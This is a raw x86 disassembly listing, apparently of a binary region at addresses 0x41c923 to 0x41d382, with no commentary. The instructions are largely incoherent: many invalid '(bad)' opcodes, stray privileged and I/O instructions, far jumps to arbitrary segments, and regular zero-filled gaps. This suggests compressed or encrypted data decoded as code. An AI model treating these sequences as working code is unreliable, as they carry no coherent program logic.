  41c923:	stos   DWORD PTR es:[edi],eax
  41c924:	loop   0x41c8e9
  41c926:	cmc    
  41c927:	lahf   
  41c928:	sub    ebp,eax
  41c92a:	fld    TBYTE PTR [edi+0x2a]
  41c92d:	cld    
  41c92e:	dec    esp
  41c92f:	scas   eax,DWORD PTR es:[edi]
  41c930:	icebp  
  41c931:	mov    edx,0x244c74da
  41c936:	sti    
  41c937:	and    eax,0xa2f4f4c2
  41c93c:	scas   eax,DWORD PTR es:[edi]
  41c93d:	mov    bh,0x4e
  41c93f:	int    0x3b
  41c941:	xor    eax,0x3b3051d1
  41c946:	or     esi,DWORD PTR [ebx+0x26]
  41c949:	cmc    
  41c94a:	retf   
  41c94b:	cld    
  41c94c:	jmp    0x17d8:0xbe1bbeb9
  41c953:	jg     0x41c949
  41c955:	pushf  
  41c956:	or     BYTE PTR [esi],ah
  41c958:	xchg   ebx,eax
  41c959:	mov    eax,0x2239d62
  41c95e:	cwde   
  41c95f:	int    0x8
  41c961:	xor    al,0x8
  41c963:	xor    eax,0x63f9153f
  41c968:	pop    edx
  41c969:	inc    esp
  41c96a:	test   al,bh
  41c96c:	jbe    0x41c912
  41c96e:	test   edx,edi
  41c970:	(bad)  
  41c971:	shl    edx,1
  41c973:	sub    eax,0x715f044e
  41c978:	and    bl,cl
  41c97a:	inc    eax
  41c97b:	cli    
  41c97c:	call   0x6b90:0xbb36b3ff
  41c983:	sub    al,0xdf
  41c985:	xor    cl,bl
  41c987:	repnz cld 
  41c989:	mov    ?,WORD PTR cs:[edi+0x14529c79]
  41c990:	mov    al,ds:0x3c481e44
  41c995:	out    0xbd,al
  41c997:	call   0xbeaf763f
  41c99c:	pop    ss
  41c99d:	push   eax
  41c99e:	and    bl,al
  41c9a0:	jmp    0x657a304e
  41c9a5:	(bad)
  41c9aa:	cmp    DWORD PTR [ecx-0x7f],ecx
  41c9ad:	xchg   esi,eax
  41c9ae:	mov    esi,0xfe9d33c9
  41c9b3:	and    al,0xab
  41c9b5:	jmp    0x41c971
  41c9b7:	ror    DWORD PTR [eax],cl
  41c9b9:	inc    ebx
  41c9ba:	pop    ebx
  41c9bb:	xchg   ebx,eax
  41c9bc:	out    dx,eax
  41c9bd:	popa   
  41c9be:	jo     0x41c9e9
  41c9c0:	sub    cl,al
  41c9c2:	jbe    0x41ca2c
  41c9c4:	in     eax,dx
  41c9c5:	shl    BYTE PTR [eax-0x4e7869c5],0xb1
  41c9cc:	pop    ss
  41c9cd:	xchg   ecx,eax
  41c9ce:	inc    esp
  41c9cf:	push   cs
  41c9d0:	inc    ebp
  41c9d1:	cmc    
  41c9d2:	stos   DWORD PTR es:[edi],eax
  41c9d3:	sti    
  41c9d4:	(bad)  [ecx+0x79]
  41c9d7:	mov    ds:0xeecf3bb6,al
  41c9dc:	data16 mov ah,0x82
  41c9df:	test   BYTE PTR [edx-0x66e24cbe],cl
  41c9e5:	mov    DWORD PTR [eax-0x5e],eax
  41c9e8:	pop    edi
  41c9e9:	test   al,bl
  41c9eb:	ret    0xc742
  41c9ee:	sub    esi,DWORD PTR [ecx+0x3b9902b0]
  41c9f4:	retf   0x594e
  41c9f7:	and    dh,bl
  41c9f9:	(bad)  
  41c9fa:	enter  0xc9ad,0xa
  41c9fe:	cmc    
  41c9ff:	fdivr  QWORD PTR [edi+esi*8]
  41ca02:	mov    esi,0xbf67aec8
  41ca07:	xchg   ecx,eax
  41ca08:	sbb    ecx,DWORD PTR [edi-0x26]
  41ca0b:	cmp    BYTE PTR [ecx-0x3803f0d2],ah
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	loopne 0x41ca81
  41ca82:	cmp    DWORD PTR [ebx],0x130ad
  41ca88:	add    eax,0x4d000001
  41ca8d:	or     dh,BYTE PTR [eax]
  41ca8f:	inc    esi
  41ca90:	ss jno 0x41caa0
  41ca93:	cdq    
  41ca94:	and    ecx,DWORD PTR [edx-0x2c6240e6]
  41ca9a:	or     eax,0x6849e66c
  41ca9f:	stos   BYTE PTR es:[edi],al
  41caa0:	sbb    DWORD PTR [ecx],esp
  41caa2:	ficomp WORD PTR [ebx-0x36]
  41caa5:	mov    eax,0xbb3d54fb
  41caaa:	mov    ebx,0x96ec7a2e
  41caaf:	lods   eax,DWORD PTR ds:[esi]
  41cab0:	inc    esp
  41cab1:	sub    DWORD PTR [eax+0x0],eax
  41cab4:	cmp    dl,dh
  41cab6:	je     0x41cb13
  41cab8:	pop    edx
  41cab9:	sub    eax,DWORD PTR [esi-0x6a18a45b]
  41cabf:	and    BYTE PTR [ebp-0x27],bl
  41cac2:	mov    al,ds:0xc2bfb40f
  41cac7:	xor    cl,BYTE PTR [edx+0x6b448058]
  41cacd:	mov    ch,0x10
  41cacf:	fidiv  DWORD PTR [edx+0x1eea033c]
  41cad5:	sbb    BYTE PTR [ecx],dh
  41cad7:	fidiv  DWORD PTR [edi]
  41cad9:	dec    edx
  41cada:	and    esi,edx
  41cadc:	pop    ebp
  41cadd:	xchg   ebp,eax
  41cade:	es (bad) 
  41cae0:	fidiv  DWORD PTR [ebx-0x66b91715]
  41cae6:	or     esp,DWORD PTR [edi-0x123c3c86]
  41caec:	xchg   edx,eax
  41caed:	jge    0x41ca7e
  41caef:	or     BYTE PTR fs:[ebx-0x32],dl
  41caf3:	jecxz  0x41ca96
  41caf5:	jnp    0x41ca96
  41caf7:	fsub   DWORD PTR [esi-0x63a3e9b8]
  41cafd:	aaa    
  41cafe:	xor    BYTE PTR [ecx],dh
  41cb00:	pop    edi
  41cb01:	sub    esp,ebx
  41cb03:	push   edi
  41cb04:	imul   ebp,DWORD PTR [ebp-0x40],0x31eddfcc
  41cb0b:	test   BYTE PTR [eax-0x64eb9b84],dh
  41cb11:	jmp    0xcdff:0x719553c2
  41cb18:	std    
  41cb19:	or     dh,BYTE PTR [eax-0x1cff9283]
  41cb1f:	fwait
  41cb20:	push   ss
  41cb21:	mov    esp,0x378d7389
  41cb26:	inc    esp
  41cb27:	test   BYTE PTR [edi-0x3a62c367],0x46
  41cb2e:	or     BYTE PTR [eax],ah
  41cb30:	cmp    al,0x7f
  41cb32:	sti    
  41cb33:	call   0x48d7:0x99e9263c
  41cb3a:	add    eax,0xcc9ade25
  41cb3f:	jg     0x41cb3a
  41cb41:	pop    ebx
  41cb42:	sahf   
  41cb43:	nop
  41cb44:	or     eax,0xe6e87383
  41cb49:	cmovle eax,DWORD PTR [eax+edx*2-0x2d]
  41cb4e:	mov    ah,0xf0
  41cb50:	pop    ecx
  41cb51:	sbb    eax,0xf8ff2312
  41cb56:	sahf   
  41cb57:	inc    esp
  41cb58:	mov    ecx,DWORD PTR [edx-0x569e80d5]
  41cb5e:	xchg   BYTE PTR [ebp-0x2109e712],bl
  41cb64:	or     ebx,DWORD PTR [edx-0x6a40a2bb]
  41cb6a:	retf   
  41cb6b:	xchg   ecx,eax
  41cb6c:	pushf  
  41cb6d:	adc    DWORD PTR [esi],esp
  41cb6f:	test   al,0x23
  41cb71:	call   0x2a57b7df
  41cb76:	hlt    
  41cb77:	ins    DWORD PTR es:[edi],dx
  41cb78:	pop    es
  41cb79:	jecxz  0x41cb99
  41cb7b:	and    esi,DWORD PTR [eax+0x61]
  41cb7e:	inc    edi
  41cb7f:	xor    eax,0x7b85d36c
  41cb84:	mov    esp,esp
  41cb86:	jle    0x41cb4a
  41cb88:	push   esp
  41cb89:	stos   DWORD PTR es:[edi],eax
  41cb8a:	dec    esi
  41cb8b:	out    0xc9,al
  41cb8d:	and    esi,esi
  41cb8f:	retf   
  41cb90:	test   al,0x0
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x7019ce22
  41cc03:	out    dx,al
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0x7a000001
  41cc0d:	cld    
  41cc0e:	mov    dl,0xf4
  41cc10:	add    eax,0xc70e730c
  41cc15:	mov    ecx,0xaf4cb2d7
  41cc1a:	inc    esi
  41cc1b:	inc    eax
  41cc1c:	nop
  41cc1d:	outs   dx,WORD PTR ds:[esi]
  41cc1f:	and    ecx,DWORD PTR [esi-0x595b6d83]
  41cc25:	xor    eax,0x5accccde
  41cc2a:	adc    ebx,DWORD PTR [eax+0x323379cf]
  41cc30:	jl     0x41cbc9
  41cc32:	stos   BYTE PTR es:[edi],al
  41cc33:	ins    DWORD PTR es:[edi],dx
  41cc34:	outs   dx,BYTE PTR ds:[esi]
  41cc35:	or     eax,DWORD PTR [edi-0x15]
  41cc38:	pop    ss
  41cc39:	sub    DWORD PTR ds:0x6189dcd0,0xdad66abc
  41cc43:	psllw  mm4,QWORD PTR [eax+0x5e8f6af5]
  41cc4a:	mov    WORD PTR [esi],gs
  41cc4c:	pop    eax
  41cc4d:	adc    BYTE PTR [edx-0x458eba77],0xed
  41cc54:	stos   BYTE PTR es:[edi],al
  41cc55:	xchg   ebp,eax
  41cc56:	retf   
  41cc57:	push   edx
  41cc58:	inc    esi
  41cc59:	inc    eax
  41cc5a:	inc    ebx
  41cc5b:	cmp    DWORD PTR [esi],edx
  41cc5d:	(bad)  
  41cc5e:	and    ecx,DWORD PTR [esi]
  41cc60:	xor    esi,edi
  41cc62:	(bad)  
  41cc63:	fdivr  DWORD PTR [ecx-0xa]
  41cc66:	je     0x41cbf2
  41cc68:	and    eax,0xf5bcae29
  41cc6d:	pop    esi
  41cc6e:	and    eax,DWORD PTR [ebx+ebp*8-0x77c86e4d]
  41cc75:	or     eax,0xa5742814
  41cc7a:	clc    
  41cc7b:	and    ecx,DWORD PTR [esi+0x1ac0ead5]
  41cc81:	cmp    DWORD PTR [ebx-0x33507b33],esp
  41cc87:	sbb    ch,al
  41cc89:	dec    ebp
  41cc8a:	cmp    al,BYTE PTR [ebx+0x1a11a6d4]
  41cc90:	out    dx,al
  41cc91:	js     0x41cce7
  41cc93:	and    ebp,edi
  41cc95:	xchg   ebx,eax
  41cc96:	aas    
  41cc97:	popf   
  41cc98:	inc    esi
  41cc99:	fild   QWORD PTR [eax]
  41cc9b:	cdq    
  41cc9c:	cwde   
  41cc9d:	out    0xfe,al
  41cc9f:	call   FWORD PTR [eax+esi*2]
  41cca2:	inc    edi
  41cca3:	mov    bl,BYTE PTR [ecx+0x69]
  41cca6:	mov    esp,0x6206353f
  41ccab:	inc    eax
  41ccac:	addr16 jo 0x41cd01
  41ccaf:	mov    al,ds:0x7d23e6a5
  41ccb4:	(bad)  
  41ccb5:	push   ebx
  41ccb6:	dec    ecx
  41ccb7:	mov    ebp,0xce02f920
  41ccbc:	pop    edi
  41ccbd:	loope  0x41cc47
  41ccbf:	(bad)  
  41ccc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc1:	test   al,0xac
  41ccc3:	ss cwde 
  41ccc5:	pusha  
  41ccc6:	dec    eax
  41ccc7:	jmp    0xa5a7:0x87553779
  41ccce:	call   DWORD PTR [edi+edi*8-0x45f2803e]
  41ccd5:	xor    DWORD PTR [ecx+0x76dd6c40],ecx
  41ccdb:	aad    0xd6
  41ccdd:	ss stos DWORD PTR es:[edi],eax
  41ccdf:	popf   
  41cce0:	xor    al,0xd6
  41cce2:	lods   eax,DWORD PTR ds:[esi]
  41cce3:	imul   esp,DWORD PTR [esi+ebx*1],0x53445b9
  41ccea:	sbb    cl,cl
  41ccec:	(bad)  
  41cced:	pop    esp
  41ccee:	sub    eax,0xe4516107
  41ccf3:	(bad)  
  41ccf4:	jbe    0x41cd0c
  41ccf6:	sbb    DWORD PTR [eax+0x4c],esp
  41ccf9:	lods   eax,DWORD PTR ds:[esi]
  41ccfa:	pop    ebx
  41ccfb:	imul   esp,esi,0xaa310ee2
  41cd01:	jg     0x41cc8c
  41cd03:	stos   DWORD PTR es:[edi],eax
  41cd04:	dec    ebx
  41cd05:	test   al,0xc5
  41cd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd08:	sub    eax,0x8119a1c2
  41cd0d:	pop    ecx
  41cd0e:	call   0x41db12
	...
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	stos   DWORD PTR es:[edi],eax
  41cd81:	mov    ds:0x32b7dabe,eax
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x7d000001
  41cd8d:	div    edi
  41cd8f:	imul   esi,ebp,0x20
  41cd92:	retf   
  41cd93:	add    DWORD PTR [ecx],ecx
  41cd95:	jmp    0xae790c9a
  41cd9a:	mov    cl,0x61
  41cd9c:	add    BYTE PTR [edi-0x773acd5e],bh
  41cda2:	in     al,0xe7
  41cda4:	cmp    al,0x38
  41cda6:	add    BYTE PTR [esi-0x7f3f2146],al
  41cdac:	fstp   DWORD PTR [esi+0x6a]
  41cdaf:	add    dl,bl
  41cdb1:	pop    ecx
  41cdb2:	(bad)  [esi-0x119e0f74]
  41cdb8:	or     eax,0x37a256b2
  41cdbd:	inc    ebx
  41cdbe:	sbb    ecx,DWORD PTR [edi-0x51ecb5ff]
  41cdc4:	mov    DWORD PTR [ebp-0x10],edx
  41cdc7:	push   ebp
  41cdc8:	ds inc esp
  41cdca:	test   eax,0x7fc96f86
  41cdcf:	xor    eax,0xcbf0570c
  41cdd4:	xor    bl,bl
  41cdd6:	sbb    eax,0xd71b1827
  41cddb:	dec    eax
  41cddc:	pop    esi
  41cddd:	jg     0x41cd8f
  41cddf:	jecxz  0x41ce0a
  41cde1:	jmp    0x41cdce
  41cde3:	je     0x41cdec
  41cde5:	add    DWORD PTR [eax],edx
  41cde7:	clc    
  41cde8:	and    edx,DWORD PTR [ebx]
  41cdea:	daa    
  41cdeb:	pusha  
  41cdec:	stos   DWORD PTR es:[edi],eax
  41cded:	loop   0x41ce0a
  41cdef:	sub    eax,0x20724592
  41cdf4:	xor    eax,0x12c3385a
  41cdf9:	mov    dh,0x0
  41cdfb:	imul   esp,DWORD PTR [ebp+0x1893822a],0x33
  41ce02:	mov    eax,ds:0x3f15e45e
  41ce07:	push   es
  41ce08:	outs   dx,DWORD PTR ds:[esi]
  41ce09:	sar    DWORD PTR [ecx+0x3e],1
  41ce0c:	mov    eax,0x39805de3
  41ce11:	add    DWORD PTR [ebx+eax*1+0x1736123b],ebp
  41ce18:	mov    ds:0x1be7b6da,al
  41ce1d:	add    BYTE PTR [eax],al
  41ce1f:	cmp    ecx,DWORD PTR [esi+0x5f9a2626]
  41ce25:	pushf  
  41ce26:	divps  xmm0,XMMWORD PTR [ecx]
  41ce29:	fmul   DWORD PTR ds:0xc90a77d
  41ce2f:	test   eax,0xd7326a2c
  41ce34:	je     0x41cdfa
  41ce36:	call   0x8ef563cb
  41ce3b:	sbb    BYTE PTR [edi],dh
  41ce3d:	ret    0x4fbb
  41ce40:	hlt    
  41ce41:	popa   
  41ce42:	sub    dh,BYTE PTR [edx]
  41ce44:	push   edi
  41ce45:	xor    eax,0xacdff7b
  41ce4a:	or     DWORD PTR [edi-0x37c37539],0x36
  41ce51:	outs   dx,BYTE PTR ds:[esi]
  41ce52:	xchg   ebx,eax
  41ce53:	jge    0x41cea4
  41ce55:	test   eax,0x763c5ffa
  41ce5a:	fsubr  DWORD PTR [esi-0x7c]
  41ce5d:	mov    esi,0xd9d15977
  41ce62:	js     0x41ce28
  41ce64:	dec    ecx
  41ce65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce66:	fisub  DWORD PTR [ebp-0x79]
  41ce69:	mov    edi,0x7b40a819
  41ce6e:	ret    
  41ce6f:	push   ebx
  41ce70:	inc    ecx
  41ce71:	imul   edx,DWORD PTR [edx+ecx*1+0x5dee5fef],0x43
  41ce79:	mov    ch,0x63
  41ce7b:	ret    
  41ce7c:	pop    es
  41ce7d:	test   BYTE PTR [ebx+esi*8+0x1],0x59
  41ce82:	aad    0xff
  41ce84:	cmp    cl,0x82
  41ce87:	mov    al,0x12
  41ce89:	mov    al,0x3d
  41ce8b:	jmp    0xa7c61b7e
  41ce90:	xor    BYTE PTR [eax],al
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	loop   0x41cf4d
  41cf02:	xor    ecx,DWORD PTR [edi-0x44]
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0x45000001,al
  41cf0d:	xchg   ecx,eax
  41cf0e:	jl     0x41cf30
  41cf10:	repnz test al,0x1e
  41cf13:	dec    ecx
  41cf14:	jae    0x41cf95
  41cf16:	gs push es
  41cf18:	ds rcl BYTE PTR fs:[edx+0x1],0xb1
  41cf1e:	push   esp
  41cf1f:	sub    eax,0x8cfed06f
  41cf24:	aas    
  41cf25:	sbb    BYTE PTR [edi+0xa],dh
  41cf28:	mov    al,0x11
  41cf2a:	jg     0x41cf22
  41cf2c:	sbb    al,0xb2
  41cf2e:	bound  ebp,QWORD PTR [ecx]
  41cf30:	pop    ds
  41cf31:	(bad)  
  41cf32:	cmc    
  41cf33:	jno    0x41cf18
  41cf35:	dec    edi
  41cf36:	xlat   BYTE PTR ds:[ebx]
  41cf37:	mov    al,0x61
  41cf39:	scas   eax,DWORD PTR es:[edi]
  41cf3a:	or     eax,0x31e3a608
  41cf3f:	push   es
  41cf40:	fwait
  41cf41:	loope  0x41cf08
  41cf43:	fst    QWORD PTR [esi+esi*2-0x18d1f01]
  41cf4a:	out    0x69,al
  41cf4c:	mov    edx,0x90246989
  41cf51:	jmp    0x1c4e:0x669e4cdc
  41cf58:	test   DWORD PTR [ecx],0xaf95d8e0
  41cf5e:	add    eax,ebp
  41cf60:	cdq    
  41cf61:	sub    eax,edx
  41cf63:	pop    ds
  41cf64:	rcr    DWORD PTR [edi+0x4b],0x3a
  41cf68:	or     edx,DWORD PTR [edx-0x2fcb4b29]
  41cf6e:	jp     0x41cf18
  41cf70:	or     ch,al
  41cf72:	call   0x9a6562a0
  41cf77:	dec    ebx
  41cf78:	scas   eax,DWORD PTR es:[edi]
  41cf79:	test   dh,ah
  41cf7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf7c:	inc    ecx
  41cf7d:	mov    ?,eax
  41cf7f:	inc    edx
  41cf80:	lods   al,BYTE PTR ds:[esi]
  41cf81:	mov    ds:0x85868211,al
  41cf86:	rcl    DWORD PTR [ebp-0x7],cl
  41cf89:	xor    dh,BYTE PTR [edi+0x3200f42c]
  41cf8f:	shl    DWORD PTR [edi+esi*8+0x24619730],0xa1
  41cf97:	fiadd  WORD PTR [ebx]
  41cf99:	pop    ss
  41cf9a:	std    
  41cf9b:	inc    BYTE PTR [ecx-0x6f5ca612]
  41cfa1:	add    ah,BYTE PTR [eax]
  41cfa3:	jp     0x41cfe9
  41cfa5:	ret    0x7c30
  41cfa8:	scas   al,BYTE PTR es:[edi]
  41cfa9:	sbb    bh,0xf2
  41cfac:	mov    bh,0x6a
  41cfae:	sbb    al,BYTE PTR [edi-0x251e2be2]
  41cfb4:	pop    ebx
  41cfb5:	or     BYTE PTR [esi+eiz*1-0x734ffbf9],dl
  41cfbc:	sbb    al,0x1c
  41cfbe:	inc    ecx
  41cfbf:	xlat   BYTE PTR ds:[ebx]
  41cfc0:	cmp    dh,BYTE PTR [edi]
  41cfc2:	(bad)  
  41cfc3:	adc    BYTE PTR [edi],dl
  41cfc5:	sbb    BYTE PTR [edi-0x74],0x9d
  41cfc9:	inc    esi
  41cfca:	in     al,0x79
  41cfcc:	cmp    al,0x6f
  41cfce:	add    ah,dh
  41cfd0:	(bad)  
  41cfd1:	sbb    ah,BYTE PTR [eax+0x72079990]
  41cfd7:	cmp    eax,0xf9cc55af
  41cfdc:	bound  edi,QWORD PTR [esi]
  41cfde:	das    
  41cfdf:	adc    DWORD PTR [ebx],0x31
  41cfe2:	push   ebx
  41cfe3:	lods   al,BYTE PTR ds:[esi]
  41cfe4:	hlt    
  41cfe5:	test   eax,0xd7c4f409
  41cfea:	mov    eax,ds:0x809908c4
  41cfef:	xchg   esi,eax
  41cff0:	mov    edx,0xc334670b
  41cff5:	inc    eax
  41cff6:	xchg   BYTE PTR ds:0x789c9831,al
  41cffc:	jg     0x41d053
  41cffe:	rol    DWORD PTR [esi+0x3ff41267],cl
  41d004:	ds inc esp
  41d006:	sub    bl,BYTE PTR [ebp+0x35]
  41d009:	push   ebx
  41d00a:	cmp    ch,dh
  41d00c:	cld    
  41d00d:	shr    BYTE PTR [edi+ebp*1+0x53],1
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x69de78bd
  41d083:	inc    ebx
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0x3f000001
  41d08d:	shl    DWORD PTR [ebp+0x3e1da2c1],0xd
  41d094:	pop    ebx
  41d095:	inc    esp
  41d096:	call   0x93:0x7708a763
  41d09d:	shr    DWORD PTR [ecx+0x3ed51493],1
  41d0a3:	mov    esp,0x235ac624
  41d0a8:	jb     0x41d046
  41d0aa:	sahf   
  41d0ab:	aad    0xe9
  41d0ad:	fld    TBYTE PTR [esi]
  41d0af:	into   
  41d0b0:	icebp  
  41d0b1:	pop    esp
  41d0b2:	dec    ebp
  41d0b3:	jno    0x41d12f
  41d0b5:	sbb    DWORD PTR [edx+0x72e866a0],edi
  41d0bb:	nop
  41d0bc:	shr    ch,0x76
  41d0bf:	sbb    DWORD PTR [ebp*2+0x4446d141],esp
  41d0c6:	sub    al,0x5
  41d0c8:	cmp    esp,ebx
  41d0ca:	mov    ds:0x1e540228,al
  41d0cf:	test   BYTE PTR [ebp+0x4f],cl
  41d0d2:	stos   DWORD PTR es:[edi],eax
  41d0d3:	imul   ebp,DWORD PTR [ebx-0x7a9abcf7],0x2ea9c228
  41d0dd:	push   eax
  41d0de:	(bad)
  41d0e2:	out    dx,eax
  41d0e3:	sbb    eax,0x30b47d4b
  41d0e8:	pop    esi
  41d0e9:	les    eax,FWORD PTR [edx+ecx*4-0x62806e12]
  41d0f0:	scas   eax,DWORD PTR es:[edi]
  41d0f1:	imul   esp,DWORD PTR ds:0xcacece08,0x4f
  41d0f8:	(bad)  
  41d0f9:	sbb    esp,DWORD PTR [ebx-0x1774ef6b]
  41d0ff:	sbb    BYTE PTR [edx-0x39],0x4f
  41d103:	add    ecx,esi
  41d105:	cdq    
  41d106:	xor    BYTE PTR [ebx-0x9253220],dl
  41d10c:	sub    bl,BYTE PTR [esi-0x59a4cab8]
  41d112:	inc    ebx
  41d113:	daa    
  41d114:	push   ebp
  41d115:	jae    0x41d14c
  41d117:	xor    eax,0x5498ffab
  41d11c:	test   dh,dl
  41d11e:	imul   ebx,DWORD PTR [ecx+0x18],0xffffff9b
  41d122:	(bad)  
  41d123:	loop   0x41d0b2
  41d125:	and    eax,0x7cf7ce11
  41d12a:	pop    ecx
  41d12b:	repz sbb eax,0x288c1827
  41d131:	inc    edx
  41d132:	inc    ecx
  41d133:	mov    bl,0x11
  41d135:	xchg   BYTE PTR [edi-0x2c],bl
  41d138:	mov    esp,0x8d1c84eb
  41d13d:	ins    DWORD PTR es:[edi],dx
  41d13e:	std    
  41d13f:	fmul   QWORD PTR ds:0x114f9b50
  41d145:	in     eax,dx
  41d146:	cli    
  41d147:	jmp    0x7d8e:0x5318d64f
  41d14e:	mov    ebx,0xd3a8c6c5
  41d153:	(bad)  
  41d154:	retf   
  41d155:	inc    edi
  41d156:	jmp    0x39e:0x6c2d4ce5
  41d15d:	(bad)  [edi-0x111776bb]
  41d163:	ret    
  41d164:	imul   esi,DWORD PTR [esi-0x68de6067],0x49
  41d16b:	(bad)  
  41d16c:	int    0xdb
  41d16e:	jl     0x41d16c
  41d170:	and    esi,DWORD PTR [ebp+0x73]
  41d173:	outs   dx,BYTE PTR ds:[esi]
  41d174:	cmp    eax,0xca3385be
  41d179:	cmp    ecx,0x7c
  41d17c:	test   eax,0x2f07b22a
  41d181:	xchg   BYTE PTR [ecx],dl
  41d183:	fcom   QWORD PTR [eax+0x645b8112]
  41d189:	xor    DWORD PTR [esp+esi*8],ecx
  41d18c:	xor    dl,BYTE PTR [ecx+0xfc696c]
	...
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	xchg   edx,eax
  41d201:	fadd   QWORD PTR [bx+di]
  41d204:	(bad)  
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	inc    edx
  41d20d:	and    al,0x75
  41d20f:	inc    ebp
  41d210:	lea    ebx,[esi+0x1e]
  41d213:	jge    0x41d1e9
  41d215:	sti    
  41d216:	pop    ebx
  41d217:	mov    bl,0x0
  41d219:	jne    0x41d263
  41d21b:	mov    bl,0x9e
  41d21d:	jmp    0xabcf:0x3afd1f0c
  41d224:	xchg   esi,eax
  41d225:	in     al,dx
  41d226:	(bad)  
  41d227:	sti    
  41d228:	sub    al,bh
  41d22a:	in     al,dx
  41d22b:	stc    
  41d22c:	rcl    eax,1
  41d22e:	cs jl  0x41d215
  41d231:	cli    
  41d232:	mov    ebp,0x72036111
  41d237:	clc    
  41d238:	(bad)  
  41d239:	xchg   ecx,eax
  41d23a:	mov    esi,DWORD PTR [ecx+0x52]
  41d23d:	retf   0x926e
  41d240:	dec    esi
  41d242:	sub    al,0x5
  41d244:	push   cs
  41d245:	push   esp
  41d246:	mov    ah,0xcd
  41d248:	loope  0x41d1f6
  41d24a:	sbb    ebp,DWORD PTR ds:0x325470cf
  41d250:	push   ecx
  41d251:	push   0xffffffc2
  41d253:	(bad)  
  41d254:	sub    esi,ecx
  41d256:	popf   
  41d257:	into   
  41d258:	sub    eax,0xed674c6a
  41d25d:	or     eax,DWORD PTR ds:0x4349b994
  41d263:	pop    ecx
  41d264:	inc    esi
  41d265:	cdq    
  41d266:	outs   dx,DWORD PTR ds:[esi]
  41d267:	sbb    al,0xaf
  41d269:	adc    al,0x86
  41d26b:	jns    0x41d2e9
  41d26d:	out    dx,eax
  41d26e:	and    al,0x1d
  41d270:	mov    ecx,0xe4797d97
  41d275:	xchg   DWORD PTR [esi+0x2f],esp
  41d278:	fnstcw WORD PTR [edx+0x66f3a28d]
  41d27e:	mov    esp,0x5c45497
  41d283:	rcl    DWORD PTR [edi],cl
  41d285:	or     al,BYTE PTR [edx-0x60]
  41d288:	pop    esp
  41d289:	test   BYTE PTR [edi+0x2e],ah
  41d28c:	test   al,0x3d
  41d28e:	inc    ebp
  41d28f:	cld    
  41d290:	push   cs
  41d291:	dec    esp
  41d292:	cmc    
  41d293:	pop    ds
  41d294:	pop    edx
  41d295:	leave  
  41d296:	ret    0xbd54
  41d299:	loop   0x41d2bd
  41d29b:	cmp    DWORD PTR [edx-0x6d],ebx
  41d29e:	mov    eax,0xcc7cbe67
  41d2a3:	mov    ebp,0x67a05880
  41d2a8:	push   ds
  41d2a9:	push   edx
  41d2aa:	(bad)  
  41d2ac:	jns    0x41d318
  41d2ae:	rcl    DWORD PTR [ebx+0x77455fee],cl
  41d2b4:	lods   eax,DWORD PTR cs:[esi]
  41d2b6:	push   DWORD PTR [esi+0x6c31bfb7]
  41d2bc:	cli    
  41d2bd:	mov    eax,0x2ea17ecf
  41d2c2:	pop    ss
  41d2c3:	ret    
  41d2c4:	cmc    
  41d2c5:	cwde   
  41d2c6:	mul    DWORD PTR [edi+eiz*4+0x7b]
  41d2ca:	cvtpi2ps xmm2,QWORD PTR [edi+0x7d]
  41d2ce:	inc    eax
  41d2cf:	mov    cl,0xc0
  41d2d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d2:	push   edi
  41d2d3:	jbe    0x41d313
  41d2d5:	adc    eax,0x98dc4066
  41d2da:	in     eax,0x15
  41d2dc:	lock mov cl,0xa0
  41d2df:	sub    DWORD PTR [edi+0x5f86baed],esp
  41d2e5:	mov    eax,ds:0x36d50b62
  41d2ea:	xchg   ebx,eax
  41d2eb:	jbe    0x41d363
  41d2ed:	(bad)  
  41d2ee:	repz rcr DWORD PTR [edx+0x4a487a2f],cl
  41d2f5:	add    al,0xf3
  41d2f7:	add    DWORD PTR [esi+0xa],0x429876a8
  41d2fe:	push   ss
  41d2ff:	(bad)  
  41d300:	data16 aas 
  41d302:	xor    eax,0x7a74658c
  41d307:	pusha  
  41d308:	jbe    0x41d314
  41d30a:	sahf   
  41d30b:	adc    al,0xb6
  41d30d:	add    al,0x6e
  41d30f:	pop    ebp
  41d310:	sbb    al,BYTE PTR [eax]
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	cli    
  41d381:	push   ebx
  41d382:	and    BYTE PTR [esi-0x35],ah
